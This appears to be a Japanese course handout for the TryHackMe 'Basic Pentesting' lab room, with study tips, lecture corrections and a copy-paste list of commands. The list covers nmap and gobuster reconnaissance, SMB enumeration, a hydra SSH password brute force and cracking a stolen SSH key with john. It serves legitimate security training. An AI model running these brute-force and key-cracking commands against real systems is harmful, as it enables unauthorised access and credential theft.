@@ -1,0 +1,74 @@
+■セクション5：Basic Pentesting Room（URLが接続できない場合は、SearchからRoom名で探してください）
+https://tryhackme.com/r/room/basicpentestingjt
+
+このRoomは、偵察を主体に、基本的なハッキングを試せるRoomになります。
+最初の本格的なRoomとなるので、全体の流れを掴むため、
+
+ざっとRoom全体を確認して、どんなタスクや課題があるのかチェック（理解までは不要）
+↓
+動画を一通り視聴（1.25～1.5倍速程度の方が聞き取りやすいかもです）
+↓
+再度動画を見ながら、操作を試してみる
+
+といったやり方がおススメです。
+
+合わせて、もしお時間あれば「取り組んでおくとよいRoom」の資料にまとめたRoomを先に見ると、
+より理解が進むかと思います。
+
+
+■お詫び
+◆S5-4 ディレクトリの列挙：gobusterにて、ブラウザで「http」と入力するところを、
+「htttp」と間違って入力している箇所があります。失礼いたしました。
+
+◆S5-6 不正ログイン：hydra、ssh
+hydraコマンドの引数の説明にて、「ハイフンアイ」と話しておりますが、
+正しくは「ハイフンエル」となります。失礼いたしました。
+入力コマンド自体は正しいので、操作は問題ございません。
+
+
+■コマンドやURL一覧
+
+このセクションで使うコマンドや、参考サイトのURLをまとめています。
+コピペなどにご利用ください。
+
+講義を見ながらの操作だと、マシンの起動時間内に間に合わない、
+そもそもコマンドの文字が小さくて見づらいなどあるかと思いますので、
+ご活用いただけると幸いです。
+
+※念のため講義内のコマンドも合わせてご確認ください
+
+※IPアドレスやポート番号などは、私の操作時のものなので、書き換えてください
+
+◆S5-3 サービスの偵察：nmap
+
+nmap -sV -O 10.10.75.140
+
+◆S5-4 ディレクトリの列挙：gobuster
+
+gobuster dir -u http://10.10.115.63 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200
+
+◆S5-5 ファイル共有の偵察：smbclient、enum4linux
+
+smbclient -L 10.10.115.63
+
+（\はバックスラッシュ、環境依存でバックスラッシュが\表記になる場合があります）
+smbclient \\\\10.10.115.63\\Anonymous
+
+enum4linux -a 10.10.115.63
+
+◆S5-6 不正ログイン：hydra、ssh
+
+hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.75.140 ssh
+
+ssh jan@10.10.75.140
+
+◆S5-7 （応用）権限の横昇格：chmod、john the ripper
+
+ssh -i id_rsa kay@10.10.107.154
+
+chmod 600 id_rsa
+
+python ssh2john.py id_rsa > id_rsa_convert
+
+john id_rsa_convert --wordlist=/usr/share/wordlists/rockyou.txt
+
